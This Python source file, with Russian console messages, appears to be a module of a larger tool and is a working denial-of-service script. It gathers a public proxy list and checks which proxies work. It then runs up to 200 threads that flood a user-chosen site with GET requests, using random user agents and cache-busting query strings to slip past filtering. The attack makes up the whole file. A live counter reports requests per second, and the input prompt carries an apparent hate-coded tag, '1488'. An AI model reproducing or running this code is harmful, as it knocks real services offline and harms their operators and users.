from modules.imports import *
from modules.config import *
from modules.console import *
from modules.input import *
from modules.api import *
from modules.console import *
from modules.input import *
import threading
import requests
import time
import queue
import random
import sys
from fake_useragent import UserAgent
from concurrent.futures import ThreadPoolExecutor, as_completed

ua = UserAgent()

request_count = 0
request_lock = threading.Lock()

def clear_line():
    sys.stdout.write('\033[2K\033[1G')
    sys.stdout.flush()

def print_status(text, color="secondary"):
    clear_line()
    if color == "red":
        console.print(f"[red]{text}[/red]", end="")
    elif color == "green":
        console.print(f"[green]{text}[/green]", end="")
    elif color == "yellow":
        console.print(f"[yellow]{text}[/yellow]", end="")
    else:
        console.print(f"[secondary]{text}[/secondary]", end="")
    sys.stdout.flush()

def get_proxies():
    """Сбор прокси из vakhov.github.io"""
    print_status("Сбор прокси с vakhov.github.io...")
    proxies = []
    
    try:
        r = requests.get("https://vakhov.github.io/fresh-proxy-list/proxylist.json", timeout=15)
        if r.status_code == 200:
            data = r.json()
            for p in data:
                ip = p.get('ip')
                port = p.get('port')
                if ip and port:
                    proxies.append(f"{ip}:{port}")
    except Exception as e:
        print_status(f"Ошибка: {e}", "red")
        time.sleep(1)
    
    proxies = list(set(proxies))
    random.shuffle(proxies)
    
    clear_line()
    console.print(f"[green]Собрано {len(proxies)} прокси[/green]")
    return proxies

def check_proxy(proxy):
    try:
        r = requests.get(
            'http://httpbin.org/ip', 
            proxies={'http': f'http://{proxy}', 'https': f'http://{proxy}'}, 
            timeout=2,
            headers={'User-Agent': ua.random}
        )
        if r.status_code == 200:
            return proxy
    except:
        pass
    return None

def attack_worker(target, proxy, stop_event):
    global request_count
    
    proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
    
    while not stop_event.is_set():
        try:
            paths = ['', '/', '/index.php', '/wp-admin', '/api', '/test', '/home', '/about']
            path = random.choice(paths)
            full_url = target.rstrip('/') + path
            
            full_url += f'?{random.randint(1, 999999)}={random.randint(1, 999999)}'
            
            requests.get(
                full_url,
                headers={
                    'User-Agent': ua.random,
                    'Accept': '*/*',
                    'Connection': 'keep-alive',
                },
                proxies=proxies,
                timeout=1
            )
            
            with request_lock:
                request_count += 1
                
        except:
            pass
            
        time.sleep(0.05)

def print_stats(stop_event):
    global request_count
    last_count = 0
    start_time = time.time()
    
    while not stop_event.is_set():
        time.sleep(1)
        current = request_count
        rps = current - last_count
        last_count = current
        elapsed = int(time.time() - start_time)
        
        clear_line()
        console.print(f"[red]⚡ RPS: {rps} | Всего: {current} | Время: {elapsed}с[/red]", end="")
        sys.stdout.flush()

def dos():
    target = v2i('Введите IP или домен', 'hatedfame@1488')
    
    if not target.startswith('http'):
        target = 'http://' + target
    
    threads_count = 200
    console.print(f"Цель: {target}")
    console.print(f"Потоков: {threads_count}")
    
    raw_proxies = get_proxies()
    
    if not raw_proxies:
        console.print("[red]Нет прокси[/red]")
        return
    
    print_status("Проверка прокси...")
    working = []
    
    with ThreadPoolExecutor(max_workers=100) as executor:
        futures = {executor.submit(check_proxy, p): p for p in raw_proxies[:300]}
        
        for i, future in enumerate(as_completed(futures)):
            if i % 25 == 0:
                print_status(f"Проверено {i+1}/{len(futures)} | Найдено: {len(working)}")
            
            if future.result():
                working.append(future.result())
    
    clear_line()
    console.print(f"[green]Рабочих прокси: {len(working)}[/green]")
    
    if not working:
        console.print("[red]Нет рабочих прокси[/red]")
        return
    
    working = working[:200]
    
    console.print(f"[red]Запуск DoS атаки на {target} с {len(working)} прокси...[/red]")
    
    stop_event = threading.Event()
    
    attack_threads = []
    for proxy in working:
        t = threading.Thread(
            target=attack_worker, 
            args=(target, proxy, stop_event),
            daemon=True
        )
        t.start()
        attack_threads.append(t)
    
    stats_thread = threading.Thread(target=print_stats, args=(stop_event,), daemon=True)
    stats_thread.start()
    
    try:
        while True:
            time.sleep(0.1)
    except KeyboardInterrupt:
        stop_event.set()
        clear_line()
        console.print("\n[yellow]Атака остановлена[/yellow]")
        console.print(f"Всего запросов: {request_count}")
        time.sleep(1)